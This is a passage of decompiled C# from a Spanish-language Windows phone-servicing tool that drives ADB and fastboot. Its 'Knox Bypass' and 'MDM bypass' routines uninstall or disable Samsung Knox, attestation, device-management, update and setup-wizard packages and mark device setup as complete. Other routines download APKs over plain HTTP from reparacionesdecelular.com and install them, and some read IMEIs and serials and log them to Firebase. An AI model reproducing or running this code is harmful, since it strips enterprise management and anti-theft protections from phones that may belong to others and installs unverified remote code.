				this.txtOutput.AppendText("Iniciando proceso Knox Bypass..." + Environment.NewLine);
				List<string> list = new List<string>
				{
					"shell pm disable-user com.sec.enterprise.knox.cloudmdm.smdms",
					"Shell pm disable-user --user 0  com.sec.enterprise.knox.cloudmdm.smdms",
					"shell pm disable com.sec.enterprise.knox.cloudmdm.smdms",
					"shell pm uninstall -k --user 0 com.sec.enterprise.knox.cloudmdm.smdms",
					"shell pm uninstall --user 0 com.sec.enterprise.knox.cloudmdm.smdms",
					"shell pm disable-user com.samsung.android.knox.containercore",
					"shell pm disable-user --user 0 com.samsung.android.knox.containercore",
					"shell pm disable com.samsung.android.knox.containercore",
					"shell pm uninstall -k --user 0 com.samsung.android.knox.containercore",
					"shell pm uninstall --user 0 com.samsung.android.knox.containercore",
					"shell pm disable-user com.sec.enterprise.knox.attestation",
					"shell pm disable-user --user 0 com.sec.enterprise.knox.attestation",
					"shell pm disable com.sec.enterprise.knox.attestation",
					"shell pm uninstall -k --user 0 com.sec.enterprise.knox.attestation",
					"shell pm uninstall --user 0 com.sec.enterprise.knox.attestation",
					"shell pm disable-user com.samsung.android.knox.containeragent",
					"shell pm disable-user --user 0 com.samsung.android.knox.containeragent",
					"shell pm disable com.samsung.android.knox.containeragent",
					"shell pm uninstall -k --user 0 com.samsung.android.knox.containeragent",
					"shell pm uninstall --user 0 com.samsung.android.knox.containeragent",
					"shell pm disable-user com.samsung.knox.keychain",
					"shell pm disable-user --user 0 com.samsung.knox.keychain",
					"shell pm disable com.samsung.knox.keychain",
					"shell pm uninstall -k --user 0 com.samsung.knox.keychain",
					"shell pm uninstall --user 0 com.samsung.knox.keychain",
					"shell pm disable-user com.samsung.android.knox.analytics.uploader",
					"shell pm disable-user --user 0 com.samsung.android.knox.analytics.uploader",
					"shell pm disable com.samsung.android.knox.analytics.uploader",
					"shell pm uninstall -k --user 0 com.samsung.android.knox.analytics.uploader",
					"shell pm uninstall --user 0 com.samsung.android.knox.analytics.uploader",
					"shell pm disable-user com.knox.vpn.proxyhandler",
					"shell pm disable-user --user 0 com.knox.vpn.proxyhandler",
					"shell pm disable com.knox.vpn.proxyhandler",
					"shell pm uninstall -k --user 0 com.knox.vpn.proxyhandler",
					"shell pm uninstall --user 0 com.knox.vpn.proxyhandler",
					"shell pm disable-user com.sec.android.app.setupwizardlegalprovider",
					"shell pm disable-user --user 0 com.sec.android.app.setupwizardlegalprovider",
					"shell pm disable com.sec.android.app.setupwizardlegalprovider",
					"shell pm uninstall -k --user 0 com.sec.android.app.setupwizardlegalprovider",
					"shell pm uninstall --user 0 com.sec.android.app.setupwizardlegalprovider",
					"shell pm disable-user com.samsung.android.easysetup",
					"shell pm disable-user --user 0 com.samsung.android.easysetup",
					"shell pm disable com.samsung.android.easysetup",
					"shell pm uninstall -k --user 0 com.samsung.android.easysetup",
					"shell pm uninstall --user 0 com.samsung.android.easysetup",
					"shell pm disable-user com.google.android.partnersetup",
					"shell pm disable-user --user 0 com.google.android.partnersetup",
					"shell pm disable com.google.android.partnersetup",
					"shell pm uninstall -k --user 0 com.google.android.partnersetup",
					"shell pm uninstall --user 0 com.google.android.partnersetup",
					"shell pm disable-user com.sec.android.soagent",
					"shell pm disable-user --user 0 com.sec.android.soagent",
					"shell pm disable com.sec.android.soagent",
					"shell pm uninstall -k --user 0 com.sec.android.soagent",
					"shell pm uninstall --user 0 com.sec.android.soagent",
					"shell pm disable-user com.wssyncmldm",
					"shell pm disable-user --user 0 com.wssyncmldm",
					"shell pm disable com.wssyncmldm",
					"shell pm uninstall -k --user 0 com.wssyncmldm",
					"shell pm uninstall --user 0 com.wssyncmldm",
					"shell pm uninstall -k --user 0 com.LocalFota",
					"shell pm uninstall --user 0 com.LocalFota",
					"shell pm uninstall -k --user 0 com.samsung.syncmlservice",
					"shell pm uninstall --user 0 com.samsung.syncmlservice",
					"shell pm uninstall -k --user 0 com.sec.android.fotaclient",
					"shell pm uninstall --user 0 com.sec.android.fotaclient",
					"shell pm uninstall -k --user 0 com.sec.android.fwupgrade",
					"shell pm uninstall --user 0 com.sec.android.fwupgrade",
					"shell pm uninstall -k --user 0 com.sprint.w.installer",
					"shell pm uninstall --user 0 com.sprint.w.installer",
					"shell pm uninstall -k --user 0 com.sprint.zone",
					"shell pm uninstall --user 0 com.sprint.zone",
					"shell pm uninstall -k --user 0 com.ws.dm",
					"shell pm uninstall --user 0 com.ws.dm",
					"shell pm uninstall --user 0 com.wssyncmldm",
					"shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:s:1",
					"shell pm disable-user --user 0 com.sec.android.app.setupwizard",
					"shell pm disable-user --user 0 com.sec.android.app.setupwizardlegalprovider",
					"shell pm disable-user --user 0 com.sec.android.app.SecSetupWizard",
					"shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:s:1",
					"shell pm disable-user --user 0 com.sec.android.app.setupwizard",
					"shell pm disable-user --user 0 com.sec.android.app.setupwizardlegalprovider",
					"shell pm disable-user --user 0 com.sec.android.app.SecSetupWizard",
					"reboot"
				};
				try
				{
					foreach (string command in list)
					{
						this.ExecuteAdbCommand(command, selectedDevice);
					}
				}
				finally
				{
					List<string>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
				this.txtOutput.AppendText("Knox Bypass terminado." + Environment.NewLine);
				this.txtOutput.AppendText("En caso de no funcionar es porque tiene nueva seguridad, intentar con Knox Full." + Environment.NewLine);
				this.txtOutput.AppendText("Done..." + Environment.NewLine);
			}
			catch (Exception ex)
			{
				MessageBox.Show(string.Format("Error durante Knox Bypass: {0}", ex.Message), "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x06000076 RID: 118 RVA: 0x00005610 File Offset: 0x00003810
		private void btnPlayOriginal_Click(object sender, EventArgs e)
		{
			this.VerificarEntornoSeguro();
			try
			{
				List<string> adbDevices = this.GetAdbDevices();
				bool flag = adbDevices.Count == 0 || this.cmbDevicesAdb.SelectedItem == null;
				if (flag)
				{
					MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
				}
				else
				{
					string selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
					Dictionary<string, string> paquetesDict = new Dictionary<string, string>
					{
						{
							"Google Play Services",
							"com.google.android.gms"
						},
						{
							"Google Play Store",
							"com.android.vending"
						},
						{
							"Google Services Framework",
							"com.google.android.gsf"
						}
					};
					this.MostrarEstadoAntesDelProceso("Google Play Original", paquetesDict, selectedDevice);
					List<string> item = new List<string>
					{
						"shell pm clear --user 0 com.google.android.gms",
						"shell pm clear --user 0 com.android.vending",
						"shell pm clear --user 0 com.google.android.gsf",
						"shell pm disable-user --user 0 com.google.android.gsf",
						"shell pm disable-user --user 0 com.google.android.gms",
						"shell pm enable --user 0 com.google.android.gms",
						"reboot"
					};
					List<List<string>> etapas = new List<List<string>>
					{
						item
					};
					this.EjecutarProcesoAdb("Play Store Original", etapas, selectedDevice);
					this.MostrarEstadoDespuesDelProceso("Google Play Original", paquetesDict, selectedDevice);
					this.txtOutput.AppendText("En caso de no funcionar es porque tiene nueva seguridad, intentar con METODO NEW." + Environment.NewLine);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(string.Format("Error durante la ejecución de Play Store Fix: {0}", ex.Message));
			}
		}

		// Token: 0x06000077 RID: 119 RVA: 0x0000579C File Offset: 0x0000399C
		private async void btnitadminall_Click(object sender, EventArgs e)
		{
			this.VerificarEntornoSeguro();
			try
			{
				List<string> devices = this.GetAdbDevices();
				bool flag = devices.Count == 0 || this.cmbDevicesAdb.SelectedItem == null;
				if (flag)
				{
					MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
				}
				else
				{
					string selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
					Dictionary<string, string> paquetesDict = new Dictionary<string, string>
					{
						{
							"Google Play Services",
							"com.google.android.gms"
						},
						{
							"Google Play Store",
							"com.android.vending"
						},
						{
							"Google Services Framework",
							"com.google.android.gsf"
						}
					};
					this.MostrarEstadoAntesDelProceso("Mdm bypass...", paquetesDict, selectedDevice);
					List<string> etapa = new List<string>
					{
						"shell pm clear --user 0 com.google.android.gms",
						"shell pm clear --user 0 com.android.vending",
						"shell pm clear --user 0 com.google.android.gsf",
						"shell pm disable-user --user 0 com.google.android.gsf",
						"shell pm disable-user --user 0 com.google.android.gms",
						"shell pm disable-user --user 0 com.hihonor.ouc",
						"shell pm uninstall --user 0 com.hihonor.ouc",
						"shell pm disable-user --user 0 com.android.vending"
					};
					List<string> etapa2 = new List<string>
					{
						"shell pm uninstall --user 0 com.android.vending"
					};
					List<string> etapa3 = new List<string>
					{
						"shell pm enable --user 0 com.google.android.gms",
						"devices"
					};
					List<List<string>> etapas = new List<List<string>>
					{
						etapa,
						etapa2,
						etapa3
					};
					this.EjecutarProcesoAdb("bypass MDM ITAdmin)", etapas, selectedDevice);
					string rutaPApk = Path.Combine("C:\\Users\\Public\\Libraries", "P.apk");
					bool flag2 = !File.Exists(rutaPApk);
					if (flag2)
					{
						bool exito = await this.DownloadFileSimple("http://reparacionesdecelular.com/up/apk/P.apk", rutaPApk);
						if (!exito)
						{
							this.txtOutput.AppendText("❌ No se pudo preparar P.apk. Se cancela el proceso." + Environment.NewLine);
							return;
						}
					}
					this.ExecuteAdbCommand(string.Format("install \"{0}\"", rutaPApk), selectedDevice);
					this.ExecuteAdbCommand("shell pm enable --user 0 com.google.android.gms", selectedDevice);
					this.txtOutput.AppendText(Environment.NewLine + "✅ Proceso exitoso. Reiniciando dispositivo..." + Environment.NewLine);
					this.ExecuteAdbCommand("reboot", selectedDevice);
					this.txtOutput.AppendText("En caso de no funcionar es porque tiene nueva seguridad, intentar con MÉTODO NEW." + Environment.NewLine);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(string.Format("Error durante bypass MDM ITAdmin All Brands: {0}", ex.Message));
			}
		}

		// Token: 0x06000078 RID: 120 RVA: 0x000057E4 File Offset: 0x000039E4
		private void btnXploitZ_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ListView1.Visible = false;
				this.txtOutput.Clear();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(2);
					this.UpdateProgressBar();
				}));
				Task.Run(async delegate()
				{
					try
					{
						List<string> devices = this.GetAdbDevices();
						bool flag2 = devices.Count == 0 || this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_1<object>(() => this.cmbDevicesAdb.SelectedItem)) == null;
						if (flag2)
						{
							MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
							return;
						}
						string selectedDevice = "";
						this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
						}));
						this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.txtOutput.AppendText("Iniciando proceso..." + Environment.NewLine);
						}));
						string workPath = "C:\\Users\\Public\\Libraries";
						bool flag3 = !Directory.Exists(workPath);
						if (flag3)
						{
							Directory.CreateDirectory(workPath);
						}
						string rutaSapk = Path.Combine(workPath, "s.apk");
						bool flag4 = !File.Exists(rutaSapk);
						if (flag4)
						{
							bool exito = await this.DownloadFileSimple("http://reparacionesdecelular.com/up/apk/s.apk", rutaSapk);
							if (!exito)
							{
								return;
							}
						}
						this.ExecuteAdbCommand(string.Format("install \"{0}\"", rutaSapk), selectedDevice);
						this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.UpdateProgressBar();
						}));
						this.ExecuteAdbCommand("shell am start -n moe.shizuku.privileged.api/moe.shizuku.manager.MainActivity", selectedDevice);
						this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.UpdateProgressBar();
						}));
						string rutaMapk = Path.Combine(workPath, "m.apk");
						if (!File.Exists(rutaMapk))
						{
							bool exito2 = await this.DownloadFileSimple("http://reparacionesdecelular.com/up/apk/m.apk", rutaMapk);
							if (!exito2)
							{
								return;
							}
						}
						this.ExecuteAdbCommand(string.Format("install \"{0}\"", rutaMapk), selectedDevice);
						this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.UpdateProgressBar();
						}));
						this.ExecuteAdbCommand("shell sh /storage/emulated/0/Android/data/moe.shizuku.privileged.api/start.sh", selectedDevice);
						this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.UpdateProgressBar();
						}));
						this.ExecuteAdbCommand("shell am start -n org.samo_lego.canta/org.samo_lego.canta.MainActivity", selectedDevice);
						this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.UpdateProgressBar();
						}));
						this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.txtOutput.AppendText("✅ Proceso terminado." + Environment.NewLine);
							this.txtOutput.AppendText("⚠️ Si no funciona, puede tener nueva seguridad. Intenta con MÉTODO NEW." + Environment.NewLine);
							this.txtOutput.AppendText("Done..." + Environment.NewLine);
						}));
					}
					catch (Exception ex)
					{
						MessageBox.Show(string.Format("Error durante la instalación: {0}", ex.Message));
					}
					finally
					{
						this.processRunning = false;
						this.AplicarPermisosDesdeFirebasePorPlan();
						this.btnCancelarProceso.Enabled = false;
					}
					Task tareaTimeout = Task.Delay(50000);
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
				});
			}
		}

		// Token: 0x06000079 RID: 121 RVA: 0x00005878 File Offset: 0x00003A78
		private async Task<bool> DownloadFileSimple(string url, string destinoArchivo)
		{
			bool result;
			try
			{
				this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.txtOutput.AppendText("\ud83d\udd04 Preparando recursos necesarios..." + Environment.NewLine);
					this.txtOutput.AppendText("⬇️ Buscando recursos necesarios..." + Environment.NewLine);
				}));
				using (HttpClient client = new HttpClient())
				{
					byte[] data = await client.GetByteArrayAsync(url);
					using (FileStream fs = new FileStream(destinoArchivo, FileMode.Create, FileAccess.Write, FileShare.None))
					{
						fs.Write(data, 0, data.Length);
					}
				}
				string nombreArchivo = Path.GetFileName(destinoArchivo).ToLower();
				string md5Esperado = "";
				string $VB$Local_nombreArchivo = nombreArchivo;
				if (Operators.CompareString($VB$Local_nombreArchivo, "s.apk", false) != 0)
				{
					if (Operators.CompareString($VB$Local_nombreArchivo, "m.apk", false) != 0)
					{
						if (Operators.CompareString($VB$Local_nombreArchivo, "itadmin.apk", false) != 0)
						{
							if (Operators.CompareString($VB$Local_nombreArchivo, "p.apk", false) != 0)
							{
								this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
								{
									this.txtOutput.AppendText("⚠️ Archivo descargado sin verificación MD5: " + Environment.NewLine);
								}));
								return true;
							}
							md5Esperado = "553c341b98751b84e1b1c6dcd9183099";
						}
						else
						{
							md5Esperado = "af276405aaa99457c41498dd61855142";
						}
					}
					else
					{
						md5Esperado = "a3c53af230dcadb52bff85be6da5dca6";
					}
				}
				else
				{
					md5Esperado = "d2db6e7df106b8fd119646374fe9b42c";
				}
				string md5Calculado = this.CalcularMD5(destinoArchivo);
				if (Operators.CompareString(md5Calculado, md5Esperado, false) != 0)
				{
					this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						this.txtOutput.AppendText("❌ Verificación de integridad fallida para " + nombreArchivo + Environment.NewLine);
						this.txtOutput.AppendText("Esperado: " + md5Esperado + Environment.NewLine);
						this.txtOutput.AppendText("Obtenido: " + md5Calculado + Environment.NewLine);
					}));
					result = false;
				}
				else
				{
					this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						this.txtOutput.AppendText("✅ Integridad verificada..." + Environment.NewLine);
					}));
					result = true;
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(string.Format("Error al descargar/verificar archivo desde: {0}", url) + Environment.NewLine + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				result = false;
			}
			return result;
		}

		// Token: 0x0600007A RID: 122 RVA: 0x000058CC File Offset: 0x00003ACC
		private void MostrarOpciones()
		{
			this.ListView1.Items.Clear();
			this.ListView1.Items.Add(new ListViewItem("\ud83d\udce5 Descargar Firmware"));
			this.ListView1.Items.Add(new ListViewItem("\ud83d\udcc4 Ver Documentos de Proceso"));
			this.ListView1.Items.Add(new ListViewItem("\ud83d\udcc2 Ver Log de Proceso"));
			this.ListView1.Items.Add(new ListViewItem("\ud83d\uddbc️ Ver Imágenes de Proceso"));
			this.ListView1.Items.Add(new ListViewItem("\ud83d\udee0️ Descargar Soluciones"));
			this.ListView1.Items.Add(new ListViewItem("\ud83c\udd98 Solicitar Soporte"));
			this.ListView1.Visible = true;
		}

		// Token: 0x0600007B RID: 123 RVA: 0x0000599C File Offset: 0x00003B9C
		private string ExecuteCommand(string command)
		{
			string result;
			try
			{
				Process process = new Process();
				process.StartInfo.FileName = "cmd.exe";
				process.StartInfo.Arguments = string.Format("/c {0}", command);
				process.StartInfo.RedirectStandardOutput = true;
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.CreateNoWindow = true;
				process.Start();
				string text = process.StandardOutput.ReadToEnd();
				process.WaitForExit();
				result = text;
			}
			catch (Exception ex)
			{
				Exception ex2;
				Exception $VB$Local_ex = ex2;
				Exception ex = $VB$Local_ex;
				base.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.txtOutput.AppendText(string.Format("Error executing command '{0}': {1}", command, ex.Message) + Environment.NewLine);
				}));
				result = string.Empty;
			}
			return result;
		}

		// Token: 0x0600007C RID: 124 RVA: 0x00005A8C File Offset: 0x00003C8C
		private void btncheckport_Click(object sender, EventArgs e)
		{
			this.VerificarEntornoSeguro();
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("Ya hay un proceso en ejecución. Por favor, espera a que termine.", "Proceso en Ejecución", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
			else
			{
				this.AplicarPermisosDesdeFirebasePorPlan();
				this.cmbDevices.Items.Clear();
				this.cmbDevices.Enabled = true;
				this.txtOutput.Clear();
				this.GetFastbootDevices();
			}
		}

		// Token: 0x0600007D RID: 125 RVA: 0x00005AFC File Offset: 0x00003CFC
		private async void cmbDevices_SelectedIndexChanged(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("Ya hay un proceso en ejecución. Por favor, espera a que termine.", "Proceso en Ejecución", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
			else
			{
				bool flag2 = this.cmbDevices.SelectedIndex >= 0 && Operators.CompareString(this.cmbDevices.SelectedItem.ToString(), "Waiting for devices...", false) != 0;
				if (flag2)
				{
					string selectedDevice = this.cmbDevices.SelectedItem.ToString();
					this.cmbDevices.Enabled = false;
					await Task.Run(delegate()
					{
						this.ReadFastbootDeviceInfo(selectedDevice);
					});
					this.cmbDevices.Enabled = true;
				}
			}
		}

		// Token: 0x0600007E RID: 126 RVA: 0x00005B44 File Offset: 0x00003D44
		private async void btnReadFastboot_Click(object sender, EventArgs e)
		{
			this.SetAllButtonsEnabled(false, null);
			this.txtOutput.Clear();
			this.cmbDevices.Items.Clear();
			List<string> devices = await Task.Run<List<string>>(() => this.GetFastbootDevices());
			if (devices.Count > 0)
			{
				try
				{
					foreach (string device in devices)
					{
						this.cmbDevices.Items.Add(device);
					}
				}
				finally
				{
					List<string>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
				this.cmbDevices.SelectedIndex = 0;
				this.fastbootTimer.Enabled = false;
			}
			else
			{
				this.cmbDevices.Items.Add("Waiting for devices...");
				this.cmbDevices.SelectedIndex = 0;
				this.txtOutput.AppendText("No Fastboot devices found." + Environment.NewLine);
				this.btnReadFastboot.Enabled = true;
			}
			try
			{
			}
			catch (Exception ex)
			{
				MessageBox.Show("❌ Error: " + ex.Message);
			}
			finally
			{
				this.processRunning = false;
				this.btnCancelarProceso.Enabled = false;
				this.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.AplicarPermisosDesdeFirebasePorPlan();
				}));
			}
		}

		// Token: 0x0600007F RID: 127 RVA: 0x00005B8C File Offset: 0x00003D8C
		private List<string> GetFastbootDevices()
		{
			List<string> list = new List<string>();
			try
			{
				string text = this.ExecuteCommand("fastboot devices");
				bool flag = !string.IsNullOrEmpty(text);
				if (flag)
				{
					foreach (string text2 in text.Split(new string[]
					{
						Environment.NewLine
					}, StringSplitOptions.RemoveEmptyEntries))
					{
						string[] array2 = text2.Split(new char[]
						{
							' '
						}, StringSplitOptions.RemoveEmptyEntries);
						bool flag2 = array2.Length > 0;
						if (flag2)
						{
							list.Add(array2[0]);
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1._Closure$__86-0 CS$<>8__locals1 = new Form1._Closure$__86-0(CS$<>8__locals1);
				CS$<>8__locals1.$VB$Me = this;
				Exception $VB$Local_ex = ex;
				CS$<>8__locals1.$VB$Local_ex = $VB$Local_ex;
				base.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					CS$<>8__locals1.$VB$Me.txtOutput.AppendText(string.Format("Error reading fastboot devices: {0}", CS$<>8__locals1.$VB$Local_ex.Message) + Environment.NewLine);
				}));
			}
			return list;
		}

		// Token: 0x06000080 RID: 128 RVA: 0x00005C7C File Offset: 0x00003E7C
		private void ReadFastbootDeviceInfo(string device)
		{
			base.Invoke((Form1._Closure$__.$I87-0 == null) ? (Form1._Closure$__.$I87-0 = delegate()
			{
			}) : Form1._Closure$__.$I87-0);
			Dictionary<string, string> fastbootInfo = this.GetFastbootInfo();
			base.Invoke(new VB$AnonymousDelegate_0(delegate()
			{
				this.txtOutput.Clear();
				this.txtOutput.AppendText(string.Format("Process: {0}{1}", "Read Info Motorola Fastboot", Environment.NewLine));
				this.txtOutput.AppendText(string.Format("Brand: {0}{1}", "Motorola", Environment.NewLine));
				this.txtOutput.AppendText(string.Format("SN: {0}{1}", fastbootInfo["serialno"], Environment.NewLine));
				this.txtOutput.AppendText(string.Format("Codename: {0}{1}", fastbootInfo["product"], Environment.NewLine));
				this.txtOutput.AppendText(string.Format("Model: {0}{1}", fastbootInfo["sku"], Environment.NewLine));
				this.txtOutput.AppendText(string.Format("Carrier ID: {0}{1}", fastbootInfo["ro.carrier"], Environment.NewLine));
				this.txtOutput.AppendText(string.Format("IMEI: {0}{1}", fastbootInfo["imei"], Environment.NewLine));
				this.txtOutput.AppendText(string.Format("Bootloader Lock: {0}{1}", fastbootInfo["securestate"], Environment.NewLine));
				this.txtOutput.AppendText(string.Format("Slot SIM: {0}{1}", fastbootInfo["slot-count"], Environment.NewLine));
				this.txtOutput.AppendText(string.Format("Memory Type: {0}{1}", fastbootInfo["storage-type"], Environment.NewLine));
				this.txtOutput.AppendText(string.Format("Cpu: {0}{1}", fastbootInfo["cpu"], Environment.NewLine));
				bool flag = !string.IsNullOrEmpty(fastbootInfo["firmware"]) && Operators.CompareString(fastbootInfo["firmware"], "No detectado", false) != 0;
				if (flag)
				{
					string text2 = fastbootInfo["firmware"];
				}
				else
				{
					bool flag2 = !string.IsNullOrEmpty(fastbootInfo["firmware01Limpio"]) && Operators.CompareString(fastbootInfo["firmware01Limpio"], "No detectado", false) != 0;
					if (flag2)
					{
						string text2 = fastbootInfo["firmware01Limpio"];
					}
				}
				this.txtOutput.AppendText(string.Format("Firmware: {0}{1}", fastbootInfo["firmware_final"], Environment.NewLine));
			}));
			this.btnReadFastboot.Enabled = true;
			this.ActualizarProgreso();
			this.GuardarLogDesdeTxtOutput();
			this.TextBox1.Text = "Log guardado en: C:\\Tstool\\Logs";
			string text = this.txtOutput.Text;
			this.GuardarLogEnFirebase(text);
			this.ActualizarProgreso();
		}

		// Token: 0x06000081 RID: 129 RVA: 0x00005D28 File Offset: 0x00003F28
		private Dictionary<string, string> GetFastbootInfo()
		{
			Dictionary<string, string> dictionary = new Dictionary<string, string>();
			string[] array = new string[]
			{
				"product",
				"serialno",
				"storage-type",
				"securestate",
				"ro.carrier",
				"slot-count",
				"sku",
				"imei",
				"imei2",
				"version-baseband",
				"cpu"
			};
			foreach (string text in array)
			{
				dictionary[text] = this.ObtenerValorFastboot(text);
			}
			string salida = this.EjecutarFastboot("getvar ro.build.fingerprint");
			dictionary["ro.build.fingerprint"] = this.ConcatenarFingerprint(salida);
			dictionary["firmware"] = this.LimpiarFirmware(dictionary["ro.build.fingerprint"]);
			string text2 = this.EjecutarFastboot("getvar ro.build.fingerprint[0]");
			dictionary["ro.build.fingerprint[0]"] = this.ConcatenarFingerprint0(text2);
			string text3 = this.EjecutarFastboot("getvar ro.build.fingerprint[1]");
			dictionary["ro.build.fingerprint[1]"] = this.ConcatenarFingerprint0(text3);
			dictionary["firmware0"] = this.LimpiarFirmware(dictionary["ro.build.fingerprint[0]"]);
			dictionary["firmware1"] = this.LimpiarFirmware(dictionary["ro.build.fingerprint[1]"]);
			dictionary["firmware01"] = this.ExtraerFirmwareDeLineasSeparadas(text2, text3);
			dictionary["firmware01Limpio"] = this.LimpiarFirmware(dictionary["firmware01"]);
			bool flag = !string.IsNullOrEmpty(dictionary["firmware"]) && Operators.CompareString(dictionary["firmware"], "No detectado", false) != 0;
			if (flag)
			{
				dictionary["firmware_final"] = dictionary["firmware"];
			}
			else
			{
				bool flag2 = !string.IsNullOrEmpty(dictionary["firmware01Limpio"]) && Operators.CompareString(dictionary["firmware01Limpio"], "No detectado", false) != 0;
				if (flag2)
				{
					dictionary["firmware_final"] = dictionary["firmware01Limpio"];
				}
				else
				{
					dictionary["firmware_final"] = "No detectado";
				}
			}
			return dictionary;
		}

		// Token: 0x06000082 RID: 130 RVA: 0x00005F74 File Offset: 0x00004174
		private string EjecutarFastboot(string comando)
		{
			string result;
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = "C:\\Tstool\\fastboot.exe";
				processStartInfo.Arguments = comando;
				processStartInfo.RedirectStandardOutput = true;
				processStartInfo.RedirectStandardError = true;
				processStartInfo.UseShellExecute = false;
				processStartInfo.CreateNoWindow = true;
				Process process = new Process();
				process.StartInfo = processStartInfo;
				process.Start();
				string str = process.StandardOutput.ReadToEnd();
				string str2 = process.StandardError.ReadToEnd();
				process.WaitForExit();
				result = str + "\r\n" + str2;
			}
			catch (Exception ex)
			{
				result = string.Format("Error al ejecutar fastboot: {0}", ex.Message);
			}
			return result;
		}

		// Token: 0x06000083 RID: 131 RVA: 0x00006038 File Offset: 0x00004238
		private string ObtenerValorFastboot(string variable)
		{
			string input = this.EjecutarFastboot(string.Format("getvar {0}", variable));
			string pattern = string.Format("{0}:\\s*(.+)", variable);
			Match match = Regex.Match(input, pattern, RegexOptions.IgnoreCase);
			bool success = match.Success;
			string result;
			if (success)
			{
				result = match.Groups[1].Value.Trim();
			}
			else
			{
				result = "";
			}
			return result;
		}

		// Token: 0x06000084 RID: 132 RVA: 0x0000609C File Offset: 0x0000429C
		private string ConcatenarFingerprint(string salida)
		{
			string text = "";
			foreach (string text2 in salida.Split(new string[]
			{
				Environment.NewLine,
				"\r\n",
				"\n"
			}, StringSplitOptions.None))
			{
				bool flag = text2.Contains("bootloader)");
				if (flag)
				{
					int num = text2.IndexOf(":");
					bool flag2 = num != -1;
					if (flag2)
					{
						text += text2.Substring(checked(num + 1)).Trim();
					}
				}
			}
			return text;
		}

		// Token: 0x06000085 RID: 133 RVA: 0x00006140 File Offset: 0x00004340
		private string LimpiarFirmware(string firmwareBruto)
		{
			Regex regex = new Regex("([A-Z]\\d?[A-Z]{2,4}\\d{2,3}[A-Z]?\\.\\d{2,3}(-\\d{1,3}){1,6})", RegexOptions.IgnoreCase);
			Match match = regex.Match(firmwareBruto);
			bool success = match.Success;
			string result;
			if (success)
			{
				result = match.Groups[1].Value;
			}
			else
			{
				result = firmwareBruto;
			}
			return result;
		}

		// Token: 0x06000086 RID: 134 RVA: 0x00006188 File Offset: 0x00004388
		private string ConcatenarFingerprint0(string salida)
		{
			string text = "";
			foreach (string text2 in salida.Split(new string[]
			{
				Environment.NewLine,
				"\r\n",
				"\n"
			}, StringSplitOptions.None))
			{
				bool flag = text2.Contains("ro.");
				if (flag)
				{
					int num = text2.IndexOf(":");
					bool flag2 = num != -1;
					if (flag2)
					{
						text += text2.Substring(checked(num + 1)).Trim();
					}
				}
			}
			return text;
		}

		// Token: 0x06000087 RID: 135 RVA: 0x0000622C File Offset: 0x0000442C
		private string DetectarFirmware(Dictionary<string, string> fastbootInfo)
		{
			List<string> list = new List<string>();
			foreach (string key in new string[]
			{
				"git:abl",
				"ro.build.fingerprint",
				"ro.build.display.id",
				"ro.bootimage.build.fingerprint"
			})
			{
				bool flag = fastbootInfo.ContainsKey(key) && !string.IsNullOrWhiteSpace(fastbootInfo[key]);
				if (flag)
				{
					list.Add(fastbootInfo[key]);
				}
			}
			try
			{
				foreach (string firmwareBruto in list)
				{
					string text = this.LimpiarFirmware(firmwareBruto);
					bool flag2 = !string.IsNullOrEmpty(text);
					if (flag2)
					{
						return text;
					}
				}
			}
			finally
			{
				List<string>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
			return "No detectado";
		}

		// Token: 0x06000088 RID: 136 RVA: 0x00006320 File Offset: 0x00004520
		private List<string> VerificarSoporte(string codename, string carrierid)
		{
			List<string> result = new List<string>();
			try
			{
